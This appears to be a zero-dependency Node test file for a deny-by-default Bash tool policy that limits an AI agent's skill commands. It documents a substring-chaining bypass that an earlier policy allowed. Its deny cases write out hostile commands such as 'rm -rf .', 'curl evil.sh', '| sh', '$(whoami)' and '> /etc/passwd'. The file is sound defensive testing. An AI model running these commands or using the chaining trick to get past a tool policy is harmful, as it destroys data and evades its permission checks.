#!/usr/bin/env node
// test/ux/tool-policy.test.mjs — ZERO-DEPENDENCY unit test for the cockpit's named, deny-by-default
// Bash tool policy (gui/server/tool-policy.mjs). The module is pure, so this runs in PR CI for free.
//
// This is the regression test for the Codex review of PR #40: the previous policy was SUBSTRING
// based, so `node …/firecrawl-extract.mjs <url> ; rm -rf .` was allowed because it *contained* the
// allowed path. The fix is exact-argv matching with shell-metacharacter rejection. We assert both
// the enforcement (`evaluateToolPolicy`) and the judge-independent audit (`auditToolPolicy`) deny
// that chained command.
//
// Run: node test/ux/tool-policy.test.mjs

import { evaluateToolPolicy, auditToolPolicy, tokenizeCommand } from "../../gui/server/tool-policy.mjs";

let failed = 0;
const RED = "\x1b[0;31m", GREEN = "\x1b[0;32m", NC = "\x1b[0m";
function check(label, cond) {
  if (cond) console.log(`  ${GREEN}✓${NC} ${label}`);
  else { console.log(`  ${RED}✗${NC} ${label}`); failed++; }
}

const P = "ux-onboarding";
const FC = "node .claude/skills/firecrawl-direct/firecrawl-extract.mjs https://example.com/about";
const SC = "node .claude/skills/workspace-setup/suggest-connectors.mjs";
const allow = (cmd, tool = "Bash") => evaluateToolPolicy(P, tool, cmd).allowed === true;
const deny = (cmd, tool = "Bash") => evaluateToolPolicy(P, tool, cmd).allowed === false;

console.log("policy: inert / unknown-name handling");
{
  const off = evaluateToolPolicy("", "Bash", FC);
  check("empty policy name → inactive (production unchanged)", off.active === false && off.allowed === false);
  const unknown = evaluateToolPolicy("does-not-exist", "Bash", FC);
  check("unknown policy name → active + denied (fail closed)", unknown.active === true && unknown.allowed === false);
}

console.log("policy: ALLOW only the exact firecrawl/suggest argv shapes");
{
  check("firecrawl-extract with a URL arg", allow(FC));
  check("suggest-connectors (no required args)", allow(SC));
  check("suggest-connectors with an extra plain arg", allow(SC + " --json"));
}

console.log("policy: DENY shell metacharacters / chaining (the substring bypass)");
{
  check("THE BYPASS — allowed path then ; rm -rf .", deny(FC + " ; rm -rf ."));
  check("&& chaining after allowed path", deny(FC + " && curl evil.sh"));
  check("pipe after allowed path", deny(FC + " | sh"));
  check("command substitution $()", deny("node .claude/skills/firecrawl-direct/firecrawl-extract.mjs $(whoami)"));
  check("backtick substitution", deny("node .claude/skills/firecrawl-direct/firecrawl-extract.mjs `id`"));
  check("output redirection", deny(FC + " > /etc/passwd"));
  check("newline-embedded second command", deny(FC + "\nrm -rf ."));
}

console.log("policy: DENY wrong shape / wrong binary / substring tricks");
{
  check("firecrawl path present but as an ARG to another script (argv[1] mismatch)",
    deny("node evil.mjs --x .claude/skills/firecrawl-direct/firecrawl-extract.mjs"));
  check("non-node binary", deny("rm -rf ."));
  check("bash -c wrapping", deny("bash -c node\\ x"));
  check("firecrawl-extract WITHOUT the required URL arg", deny("node .claude/skills/firecrawl-direct/firecrawl-extract.mjs"));
  check("quoted arg rejected (argv stays unambiguous)", deny('node .claude/skills/workspace-setup/suggest-connectors.mjs "a b"'));
  check("leading env-assignment rejected", deny("FOO=bar " + SC));
  check("absolute path instead of repo-relative is not the exact shape", deny("node /tmp/.claude/skills/firecrawl-direct/firecrawl-extract.mjs https://x/a"));
}

console.log("policy: only the Bash tool is ever allowable under a policy");
{
  check("Write tool denied even with an allowed-looking command", deny(FC, "Write"));
  check("WebFetch tool denied", deny(FC, "WebFetch"));
}

console.log("audit: re-derives verdicts from raw command (catches recorded drift)");
{
  // Clean transcript: server allowed exactly the firecrawl command → audit ok.
  const clean = [
    { type: "tool_policy", tool: "Bash", command: FC, allowed: true },
    { type: "tool_policy", tool: "Bash", command: "rm -rf .", allowed: false },
  ];
  const a1 = auditToolPolicy(clean, { policyName: P });
  check("clean transcript → audit ok", a1.ok === true);

  // Adversarial: imagine a buggy server that RECORDED allowed:true on a chained command.
  // The audit must still catch it by re-evaluating the raw command (does not trust the flag).
  const drifted = [
    { type: "tool_policy", tool: "Bash", command: FC + " ; rm -rf .", allowed: true },
  ];
  const a2 = auditToolPolicy(drifted, { policyName: P });
  check("recorded allowed:true on chained command → audit FAILS (no drift)", a2.ok === false &&
    a2.checks.some((c) => c.name === "no_offlist_command_allowed" && c.ok === false));

  // Firecrawl never requested → audit fails on the "was it exercised" check.
  const noFirecrawl = [{ type: "tool_policy", tool: "Bash", command: SC, allowed: true }];
  const a3 = auditToolPolicy(noFirecrawl, { policyName: P });
  check("firecrawl never requested → audit fails", a3.ok === false &&
    a3.checks.some((c) => c.name === "firecrawl_extract_requested" && c.ok === false));

  check("empty/garbage events → audit fails (nothing exercised)", auditToolPolicy([], { policyName: P }).ok === false);
}

console.log("tokenizeCommand: low-level behavior");
{
  check("plain command → argv", JSON.stringify(tokenizeCommand("node a.mjs x")) === JSON.stringify(["node", "a.mjs", "x"]));
  check("metachar → null", tokenizeCommand("node a.mjs ; ls") === null);
  check("quote → null", tokenizeCommand('node a.mjs "x"') === null);
  check("env-assignment prefix → null", tokenizeCommand("A=1 node a.mjs") === null);
  check("non-string → null", tokenizeCommand(42) === null);
  check("empty → null", tokenizeCommand("   ") === null);
}

console.log("");
if (failed) { console.log(`${RED}tool-policy.test: ${failed} check(s) failed${NC}`); process.exit(1); }
console.log(`${GREEN}tool-policy.test: all checks passed${NC}`);
